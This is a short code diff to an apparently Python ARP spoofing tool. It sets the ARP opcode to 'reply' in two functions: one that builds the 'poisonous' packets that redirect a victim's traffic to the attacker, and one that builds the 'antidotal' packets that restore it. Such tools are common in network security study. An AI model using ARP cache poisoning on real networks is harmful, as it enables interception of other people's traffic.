@@ -47,6 +47,7 @@ def construct_poisonous_packet(me: Host, source: Host, destination: Host):
     packet[ARP].pdst = source.ip_addr
     packet[ARP].hwsrc = me.mac_addr
     packet[ARP].hwdst = source.mac_addr
+    packet[ARP].opcode = 2
 
     return packet
 
@@ -58,6 +59,7 @@ def construct_antidotal_packet(me: Host, source: Host, destination: Host):
     packet[ARP].pdst = source.ip_addr
     packet[ARP].hwsrc = destination.mac_addr
     packet[ARP].hwdst = source.mac_addr
+    packet[ARP].opcode = 2
 
     return packet
 
